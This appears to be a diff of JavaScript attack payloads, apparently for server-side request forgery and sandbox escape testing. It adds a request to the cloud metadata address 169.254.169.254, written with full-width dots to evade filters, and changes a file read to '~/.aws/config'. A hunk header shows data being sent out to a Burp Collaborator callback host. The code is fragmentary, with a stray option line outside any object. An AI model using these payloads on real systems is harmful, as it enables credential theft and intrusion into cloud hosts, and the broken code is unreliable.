@@ -49,7 +49,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 */
 var request = require('request');
 followAllRedirects: true,
-request('http://0xp.cc/redir.php', function (error, response, body) {
+request('http://169｡254｡169｡254/', function (error, response, body) {
   if (1 == 1) {
     console.log(response.statusCode);
     console.log(response.body);    // Prints the JSON object
@@ -59,7 +59,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 
 var request = require('request');
 const fs = require('fs')
-fs.readFile('/etc/hosts', 'utf8' , (err, data) => {
+fs.readFile('~/.aws/config', 'utf8' , (err, data) => {
   if (err) {
     console.error(err)
     return
